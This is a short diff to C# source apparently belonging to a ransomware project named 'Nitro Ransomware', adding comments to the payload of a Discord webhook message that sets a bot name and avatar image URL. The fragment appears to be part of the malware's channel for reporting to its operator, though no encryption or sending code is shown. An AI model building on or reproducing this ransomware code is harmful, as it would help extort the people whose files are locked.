@@ -15,8 +15,8 @@ namespace NitroRansomware
             Dictionary<string, string> data = new Dictionary<string, string>
             {
                 {"content", content },
-                {"username", "Nitro Ransomware" },
-                {"avatar_url", "https://i.ibb.co/0frTD92/discord-avatar-512.png"}
+                {"username", "Nitro Ransomware" }, //set custom bot name
+                {"avatar_url", "https://i.ibb.co/0frTD92/discord-avatar-512.png"} //set custom avatar
             };
 
             try
